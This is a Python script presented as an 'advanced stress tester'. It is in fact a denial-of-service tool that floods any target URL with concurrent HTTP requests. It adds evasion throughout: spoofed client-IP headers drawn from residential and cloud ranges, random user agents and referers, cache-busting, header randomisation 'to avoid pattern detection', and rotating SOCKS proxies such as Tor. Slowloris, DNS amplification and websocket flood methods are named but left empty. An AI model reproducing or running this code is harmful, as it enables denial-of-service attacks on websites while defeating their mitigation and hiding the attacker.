#!/usr/bin/env python3
import argparse
import asyncio
import random
import socket
import ssl
import time
import logging
import uvloop
import aiohttp
import dns.resolver
import ipaddress
from urllib.parse import urlparse, quote_plus
from fake_useragent import UserAgent
from aiohttp_socks import ProxyConnector

# Install uvloop for better performance
uvloop.install()

# Configure logging (set to DEBUG for detailed logs during testing)
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

class AdvancedStressTester:
    def __init__(self, target, duration, intensity, proxy=None):
        self.target = self.normalize_url(target)
        self.duration = duration
        self.intensity = intensity
        self.proxy = proxy
        self.ssl_ctx = self.create_evasive_ssl()
        self.user_agents = UserAgent()
        self.dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        self.start_time = time.monotonic()
        self.counter = 0
        self.active = True
        self.attack_patterns = [
            self.http_flood,
            self.slowloris,
            self.dns_amplification,
            self.websocket_flood
        ]
        # Prepare IP rotation pools
        self.setup_ip_masking()

    def setup_ip_masking(self):
        """Setup various IP pools for rotation and masking"""
        # Generate pools of different types of IPs for rotation
        self.residential_ip_ranges = [
            '24.0.0.0/8',     # Comcast
            '71.0.0.0/8',     # AT&T
            '76.0.0.0/8',     # Verizon
            '96.0.0.0/8',     # Charter
            '68.0.0.0/8',     # Time Warner
            '173.0.0.0/8',    # Cox
            '192.168.0.0/16', # Private network
            '10.0.0.0/8'      # Private network
        ]
        
        # Cloud provider ranges to appear as coming from legitimate services
        self.cloud_ip_ranges = [
            '52.0.0.0/8',     # Amazon AWS
            '35.0.0.0/8',     # Google Cloud
            '40.0.0.0/8',     # Microsoft Azure
            '104.0.0.0/8',    # Cloudflare
            '13.0.0.0/8'      # Akamai
        ]
        
        # Generate pools of IPs for each range
        self.residential_ips = self.generate_ips_from_ranges(self.residential_ip_ranges, 1000)
        self.cloud_ips = self.generate_ips_from_ranges(self.cloud_ip_ranges, 1000)
        
        # Common VPN exit node ranges (simplified)
        self.vpn_ips = self.generate_ips_from_ranges(['194.0.0.0/8', '78.0.0.0/8'], 500)
        
        # Mobile carrier IP ranges (simplified)
        self.mobile_ips = self.generate_ips_from_ranges(['174.0.0.0/8', '208.0.0.0/8'], 500)

    def generate_ips_from_ranges(self, cidr_ranges, count):
        """Generate random IPs from given CIDR ranges"""
        ip_list = []
        for _ in range(count):
            cidr = random.choice(cidr_ranges)
            network = ipaddress.ip_network(cidr)
            # Get a random IP from this network range
            random_ip = str(random.choice(list(network.hosts())))
            ip_list.append(random_ip)
        return ip_list

    def get_masked_ip(self, ip_type='random'):
        """Get a masked IP address of specified type"""
        if ip_type == 'residential' or (ip_type == 'random' and random.random() < 0.4):
            return random.choice(self.residential_ips)
        elif ip_type == 'cloud' or (ip_type == 'random' and random.random() < 0.7):
            return random.choice(self.cloud_ips)
        elif ip_type == 'vpn' or (ip_type == 'random' and random.random() < 0.9):
            return random.choice(self.vpn_ips)
        else:
            return random.choice(self.mobile_ips)

    def get_ip_headers(self):
        """Generate comprehensive IP masking headers"""
        src_ip = self.get_masked_ip()
        
        # Create a chain of IPs to simulate proxy hops
        proxy_chain = [self.get_masked_ip('cloud') for _ in range(random.randint(1, 3))]
        
        headers = {
            'X-Forwarded-For': f"{src_ip}, {', '.join(proxy_chain)}",
            'X-Real-IP': src_ip,
            'X-Originating-IP': f"[{src_ip}]",
            'CF-Connecting-IP': self.get_masked_ip('residential'),
            'True-Client-IP': self.get_masked_ip('residential'),
            'X-Client-IP': self.get_masked_ip('residential'),
            'Forwarded': f"for={src_ip};proto=https"
        }
        
        # Only include some headers randomly to avoid pattern detection
        return {k: v for k, v in headers.items() if random.random() > 0.3}

    def normalize_url(self, url):
        parsed = urlparse(url)
        if not parsed.scheme:
            parsed = parsed._replace(scheme='https' if random.random() > 0.5 else 'http')
        return parsed.geturl()

    def create_evasive_ssl(self):
        ctx = ssl.create_default_context()
        try:
            ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        except Exception as e:
            logger.debug(f"SSL option deprecation handling: {e}")
        ctx.set_ciphers('ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256')
        ctx.set_alpn_protocols(['h2', 'http/1.1'])
        return ctx

    async def http_flood(self, session):
        paths = ['/' + '/'.join([quote_plus(''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)))
                                  for _ in range(3)]) for _ in range(100)]

        async def single_request_loop():
            while self.active:
                try:
                    target_url = f"{self.target}{random.choice(paths)}?cache_bust={time.time_ns()}"
                    
                    # Get basic headers
                    headers = {
                        'User-Agent': self.user_agents.random,
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9']),
                        'Referer': random.choice([
                            'https://www.google.com/search?q=site:' + urlparse(self.target).netloc,
                            'https://www.facebook.com/',
                            'https://www.bing.com/search',
                            'https://www.reddit.com/',
                            'https://www.youtube.com/'
                        ])
                    }
                    
                    # Add IP masking headers
                    ip_headers = self.get_ip_headers()
                    headers.update(ip_headers)
                    
                    # Add some random headers to further vary the request pattern
                    if random.random() > 0.7:
                        headers['Cache-Control'] = random.choice(['no-cache', 'max-age=0', 'no-store'])
                    if random.random() > 0.7:
                        headers['Pragma'] = 'no-cache'
                    if random.random() > 0.8:
                        headers['DNT'] = '1'
                    
                    async with session.get(target_url, headers=headers, ssl=self.ssl_ctx, timeout=5) as resp:
                        await resp.read()
                        self.counter += 1
                        logger.debug(f"HTTP Flood: Received {resp.status} from {target_url}")
                except Exception as e:
                    logger.debug(f"HTTP Flood request failed: {e}")
                await asyncio.sleep(random.uniform(0.001, 0.1))

        tasks = [asyncio.create_task(single_request_loop()) for _ in range(self.intensity)]
        await asyncio.gather(*tasks)

    async def slowloris(self, session):
        # Placeholder for the slowloris method
        pass

    async def dns_amplification(self, session):
        # Placeholder for the dns_amplification method
        pass

    async def websocket_flood(self, session):
        # Placeholder for the websocket_flood method
        pass

    async def run(self):
        # Create a rotating proxy setup if proxy is provided
        if self.proxy and ',' in self.proxy:
            # Multiple proxies provided, split them
            proxy_list = self.proxy.split(',')
            connector = aiohttp.TCPConnector(ssl=self.ssl_ctx)
            
            async def create_session_with_rotating_proxies():
                current_proxy_index = 0
                while self.active:
                    current_proxy = proxy_list[current_proxy_index]
                    current_proxy_index = (current_proxy_index + 1) % len(proxy_list)
                    try:
                        # Create a connector for this proxy
                        proxy_connector = ProxyConnector.from_url(current_proxy.strip())
                        async with aiohttp.ClientSession(connector=proxy_connector) as session:
                            await asyncio.sleep(random.uniform(5, 15))  # Use each proxy for a short time
                            await self.http_flood(session)
                    except Exception as e:
                        logger.debug(f"Proxy rotation error: {e}")
            
            # Start proxy rotation tasks
            rotation_tasks = [asyncio.create_task(create_session_with_rotating_proxies()) 
                             for _ in range(min(len(proxy_list), 5))]
            await asyncio.gather(*rotation_tasks, return_exceptions=True)
        else:
            # Single proxy or no proxy
            connector = ProxyConnector.from_url(self.proxy) if self.proxy else aiohttp.TCPConnector(ssl=self.ssl_ctx)
            async with aiohttp.ClientSession(connector=connector) as session:
                tasks = [asyncio.create_task(self.http_flood(session))]
                
                # Check duration
                if self.duration > 0:
                    try:
                        await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), 
                                             timeout=self.duration)
                    except asyncio.TimeoutError:
                        self.active = False
                        logger.info(f"Test completed after {self.duration} seconds")
                else:
                    await asyncio.gather(*tasks, return_exceptions=True)


def main():
    parser = argparse.ArgumentParser(description="Advanced Stress Tester with Enhanced IP Masking")
    parser.add_argument("target", help="Target URL for testing")
    parser.add_argument("-d", "--duration", type=int, default=300, help="Test duration in seconds (default: 300)")
    parser.add_argument("-i", "--intensity", type=int, default=100, help="Attack intensity (default: 100)")
    parser.add_argument("-p", "--proxy", help="Proxy URL or comma-separated list of proxies (e.g., socks5://127.0.0.1:9050)")
    parser.add_argument("-l", "--log-level", choices=["DEBUG", "INFO", "WARNING", "ERROR"], default="INFO",
                        help="Set logging level (default: INFO)")

    args = parser.parse_args()
    
    # Set logging level
    logging.getLogger().setLevel(getattr(logging, args.log_level))

    tester = AdvancedStressTester(args.target, args.duration, args.intensity, args.proxy)

    try:
        asyncio.run(tester.run())
    except KeyboardInterrupt:
        print("\nTest terminated by user.")
    finally:
        print(f"Completed with {tester.counter} total requests sent.")

if __name__ == "__main__":
    main()